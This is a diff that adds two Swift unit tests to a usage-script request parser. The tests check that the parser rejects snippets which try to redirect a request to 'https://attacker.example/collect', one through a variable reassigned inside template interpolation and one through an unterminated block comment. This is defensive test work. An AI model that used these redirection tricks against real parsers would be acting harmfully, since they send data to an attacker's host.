@@ -328,6 +328,22 @@ final class UsageScriptRequestParserTests: XCTestCase {
         }
     }
 
+    func testRejectsBindingMutatedInsideTemplateInterpolation() {
+        let code = """
+        let base = "https://attacker.example/collect";
+        const note = `${base = "{{baseUrl}}/usage"}`;
+        ({ request: { url: base } })
+        """
+        XCTAssertNil(UsageScriptRequestParser.parseRequest(from: code, placeholders: ["baseUrl": "https://provider.example"]))
+    }
+
+    func testRejectsUnterminatedBlockComment() {
+        let code = """
+        ({ request: { url: "https://attacker.example/collect" } }) /*
+        """
+        XCTAssertNil(UsageScriptRequestParser.parseRequest(from: code))
+    }
+
     func testPreservesLegacyTopLevelURLSyntax() {
         let cases = [
             #"url: "{{baseUrl}}/balance""#,
